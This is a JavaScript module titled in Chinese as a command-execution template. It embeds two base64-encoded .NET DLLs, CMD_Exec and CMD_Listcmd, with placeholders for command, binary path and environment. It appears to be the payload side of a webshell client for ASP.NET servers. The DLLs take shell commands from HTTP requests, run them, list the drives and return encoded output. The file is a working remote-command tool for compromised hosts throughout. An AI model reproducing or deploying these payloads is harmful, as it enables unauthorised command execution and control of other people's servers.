//
// 命令执行模板
//

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: '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AFN5c3RlbS5EaWFnbm9zdGljcwBQcm9jZXNzU3RhcnRJbmZvAFByb2Nlc3MAc2V0X1VzZVNoZWxsRXhlY3V0ZQBzZXRfUmVkaXJlY3RTdGFuZGFyZElucHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X0NyZWF0ZU5vV2luZG93AHNldF9TdGFydEluZm8Ac2V0X0FyZ3VtZW50cwBTdGFydABTeXN0ZW0uSU8AU3RyZWFtUmVhZGVyAGdldF9TdGFuZGFyZE91dHB1dABnZXRfU3RhbmRhcmRFcnJvcgBDbG9zZQBUZXh0UmVhZGVyAFJlYWRUb0VuZABoZXgAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTdWJzdHJpbmcASW50MzIAU3lzdGVtLkdsb2JhbGl6YXRpb24ATnVtYmVyU3R5bGVzAFBhcnNlAENvbnZlcnQAVG9DaGFyAFRvU3RyaW5nAEFwcGVuZABnZXRfTGVuZ3RoAHNyYwBvcF9FcXVhbGl0eQBFbmNvZGluZwBHZXRFbmNvZGluZwBGcm9tQmFzZTY0U3RyaW5nAEdldFN0cmluZwBHZXRCeXRlcwBUb0Jhc2U2NFN0cmluZwAAC1UAVABGAC0AOAABDWIAYQBzAGUANgA0AAABAAMyAAAHLQA+AHwAAQd8ADwALQABB2IAaQBuAAAHYwBtAGQAAAdlAG4AdgAAE0UAUgBSAE8AUgA6AC8ALwAgAAAHLwBjACAAAAdoAGUAeAAAAAAALfOOivJ6AEqdBosrJy5FRQAIt3pcVhk04IkIsD9ffxHVCjoDBhIJAwYSDQIGDgQgAQIcBiADDg4ODgQgAQ4OAyAAAQQgAQEIBCAAEg0EIAASCQQgAQEOBCAAEh0FAAIODg4DIAAOBgADDg4ODgwHCBIZDg4ODg4OEiUEIAEBAgUgAQESKQMgAAIEIAASMQsHBQ4SKRItEjESMQUgAg4ICAYAAggOEUEEAAEDCAQAAQ4DBSABEjkOAyAACAUHAhI5CAQAAQgOBCABDggFAAICDg4FAAESSQ4FAAEdBQ4FIAEOHQUHBwQIDhIlDgUgAR0FDgUAAQ4dBQYHAw4SJQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25U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',
    'bin': "#{newbase64::bin}",
    'cmd': "#{newbase64::cmd}",
    'env': "#{newbase64::env}"
  },
  listcmd: {
    _: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAGi3k2EAAAAAAAAAAOAAAiELAQgAAAoAAAAGAAAAAAAAbikAAAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAABQpAABXAAAAAEAAALACAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAdAkAAAAgAAAACgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAALACAAAAQAAAAAQAAAAMAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAAEAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABQKQAAAAAAAEgAAAACAAUAPCIAANgGAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswBACuAAAAAQAAEQN0BgAAAQoCBm8DAAAKfQIAAAQCBm8EAAAKfQEAAAQCcgEAAHB9BQAABAJyDQAAcH0DAAAEAnIbAABwfQQAAAQCch0AAHB9BgAABHIhAABwC3IpAABwDAJ7AgAABAJ7BQAABG8FAAAKchsAAHANCQIoAgAABigGAAAKDd4WEwRyMQAAcBEEbwcAAAooBgAACg3eAAJ7AgAABAcCCSgEAAAGCCgIAAAKbwkAAAoXKgAAARAAAAAAbgAPfQAWCAAAARMwAwBVAAAAAgAAEXIbAABwCigKAAAKC3JFAABwKAsAAApvDAAACnJPAABwbw0AAAooDgAACgoWDCseBgcImhZvDwAACowMAAABclMAAHAoEAAACgoIF1gMCAeOaTLcBioAAAATMAQAQQAAAAMAABFzEQAACgoWCysnBgMHGG8SAAAKIAMCAAAoEwAACigUAAAKKBUAAApvFgAACiYHGFgLBwNvFwAACjLQBm8YAAAKKgAAABswAgBFAAAABAAAEQJ7BAAABCUMLCYIcg0AAHAoGQAACiwZAnsFAAAEKBoAAAoDbxsAAAooHAAACgorAgMK3g8LB28HAAAKbxgAAAoK3gAGKgAAAAEQAAAAAAAANDQADwgAAAEeAigdAAAKKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAFACAAAjfgAAvAIAAMACAAAjU3RyaW5ncwAAAAB8BQAAWAAAACNVUwDUBQAAEAAAACNHVUlEAAAA5AUAAPQAAAAjQmxvYgAAAAAAAAACAAABVxUCAAkAAAAA+gEzABYAAAEAAAARAAAAAgAAAAYAAAAFAAAAAwAAAB0AAAACAAAABAAAAAEAAAACAAAAAAAKAAEAAAAAAAYALgAnAAoAQAA1AAoAVAA1AAYA2AC4AAYA+AC4AAoANAEmAQYAXgEnAAYAbAEnAAYAkgGIAQoArQE1AAoAxQE1AAYA+wEnAAYAEAIEAgYAKAInAAYAQwIuAgYAVgInAAYAkAIEAgAAAAABAAAAAAABAAEAAQAQABoAAAAFAAEAAQAGAEwAEwAGAGEAFwAGAGoAGwAGAHIAGwAGAHoAGwAGAH0AGwBQIAAAAADGAIoAHgABABwhAAAAAIYAkQAjAAIAgCEAAAAAhgCZACcAAgDQIQAAAACGAKkAJwADADQiAAAAAIYYsgAsAAQAAAABACIBAAABAAACAAABAIACIQCyADAAKQCyACwAMQA5ATUAMQBGAToAGQBSAT8AOQBlAUQAQQB2ASMAOQBlAUoAGQCCAT8ASQCcAVsAUQC5AWAAUQDXAWUAWQDiAScAOQDqAWoAOQDxAXAAOQBlAXUAaQCyACwAOQAeAoMAcQBQAokAgQBeApAAgQBlApUAaQBuApoAOQB1AqAACQBlAiMAOQCEAqoAiQCZArAAiQClArYAgQCuArwACQCyACwALgALAMkALgATANIAUQB8AKQAwgAEgAAAAAAAAAAAAAAAAAAAAAAWAQAAAgAAAAAAAAAAAAAAAQAeAAAAAAACAAAAAAAAAAAAAAAKADUAAAAAAAAAAAAAPE1vZHVsZT4AQ01EX0xpc3RjbWQuZGxsAFJ1bgBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFN5c3RlbS5XZWIASHR0cFJlcXVlc3QAUmVxdWVzdABIdHRwUmVzcG9uc2UAUmVzcG9uc2UAZW5jb2RlcgBkZWNvZGVyAGNzAHJhbmRvbVByZWZpeABFcXVhbHMAR2V0SW5mbwBIZXhBc2NpaUNvbnZlcnQAYXNvdXRwdXQALmN0b3IAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAENNRF9MaXN0Y21kAG9iagBTeXN0ZW0uV2ViLlVJAFBhZ2UAZ2V0X1Jlc3BvbnNlAGdldF9SZXF1ZXN0AHNldF9DaGFyc2V0AFN0cmluZwBDb25jYXQARXhjZXB0aW9uAGdldF9NZXNzYWdlAFdyaXRlAFN5c3RlbS5JTwBEaXJlY3RvcnkAR2V0TG9naWNhbERyaXZlcwBIdHRwQ29udGV4dABnZXRfQ3VycmVudABIdHRwU2VydmVyVXRpbGl0eQBnZXRfU2VydmVyAE1hcFBhdGgARm9ybWF0AGdldF9DaGFycwBDaGFyAGhleABTeXN0ZW0uVGV4dABTdHJpbmdCdWlsZGVyAFN1YnN0cmluZwBJbnQzMgBTeXN0ZW0uR2xvYmFsaXphdGlvbgBOdW1iZXJTdHlsZXMAUGFyc2UAQ29udmVydABUb0NoYXIAVG9TdHJpbmcAQXBwZW5kAGdldF9MZW5ndGgAc3JjAG9wX0VxdWFsaXR5AEVuY29kaW5nAEdldEVuY29kaW5nAEdldEJ5dGVzAFRvQmFzZTY0U3RyaW5nAAAAAAALVQBUAEYALQA4AAENYgBhAHMAZQA2ADQAAAEAAzIAAActAD4AfAABB3wAPAAtAAETRQBSAFIATwBSADoALwAvACAAAAl7ADAAfQAJAAADLwAAAzoAAAA2xLeVTE47RL0CFAZ0vKW8AAi3elxWGTTgiQiwP19/EdUKOgMGEgkDBhINAgYOBCABAhwDIAAOBCABDg4DIAABBCABAQgEIAASDQQgABIJBCABAQ4FAAIODg4GAAMODg4OCQcFEhkODg4SIQQAAB0OBAAAEikEIAASLQUAAg4OHAQgAQMIBgADDhwcHAYHAw4dDggFIAIOCAgGAAIIDhE9BAABAwgEAAEOAwUgARI1DgMgAAgFBwISNQgFAAICDg4FAAESRQ4FIAEdBQ4FAAEOHQUGBwMOEiEOCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQAAADwpAAAAAAAAAAAAAF4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAABQKQAAAAAAAAAAAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAAAAAYAACAAAAAAAAAAAAAAAAAAAABAAEAAAAwAACAAAAAAAAAAAAAAAAAAAABAAAAAABIAAAAWEAAAFQCAAAAAAAAAAAAAFQCNAAAAFYAUwBfAFYARQBSAFMASQBPAE4AXwBJAE4ARgBPAAAAAAC9BO/+AAABAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAQAAAACAAAAAAAAAAAAAAAAAAAARAAAAAEAVgBhAHIARgBpAGwAZQBJAG4AZgBvAAAAAAAkAAQAAABUAHIAYQBuAHMAbABhAHQAaQBvAG4AAAAAAAAAsAS0AQAAAQBTAHQAcgBpAG4AZwBGAGkAbABlAEkAbgBmAG8AAACQAQAAAQAwADAAMAAwADAANABiADAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4AMAAAAEAAEAABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAQwBNAEQAXwBMAGkAcwB0AGMAbQBkAC4AZABsAGwAAAAoAAIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAAAgAAAASAAQAAEATwByAGkAZwBpAG4AYQBsAEYAaQBsAGUAbgBhAG0AZQAAAEMATQBEAF8ATABpAHMAdABjAG0AZAAuAGQAbABsAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAcDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
    'binarr': '#{newbase64::binarr}'
  }
})
